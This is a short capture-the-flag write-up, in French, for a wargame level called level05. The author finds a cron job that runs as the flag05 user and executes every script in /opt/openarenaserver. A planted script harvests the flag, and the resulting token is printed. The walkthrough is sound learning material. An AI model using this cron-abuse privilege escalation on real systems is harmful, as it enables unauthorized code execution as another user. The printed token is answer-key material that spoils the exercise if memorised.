#A notre arrive sur la session, un message "You have a new mail" apparait

cd /var/mail
cat level05
>>> */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

#On voit que le contenu de ce mail est une tache chronique executer par flag05
#il faut donc maintenant voir ce qu'elle execute, openarenaserver n'etant pas une commande built-in elle ne dispose pas de man

cat /usr/sbin/openarenaserver

>>> 
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done

#On voit que le script execute avec bash -x tout les fichier present dans /opt/openarenaserver/
#Je decide donc d'ecrire un petit script dans mon dossier tmp

cat troll.sh
>>> echo `getflag` > /tmp/azur/out

#Et ensuite je le copie dans le dossier de la cron task sans oublier de donner les droits d'ecriture dans mon dossier

chmod 777 /tmp/azur
cp /tmp/azur/troll.sh /opt/openarenaserver

#Il nous reste plus qu'a attendre 2 minutes (car la cron task s'execute toute les deux minutes) et cat le fichier de sortie

cat /tmp/azur/out
>>> Check flag.Here is your token : viuaaale9huek52boumoomioc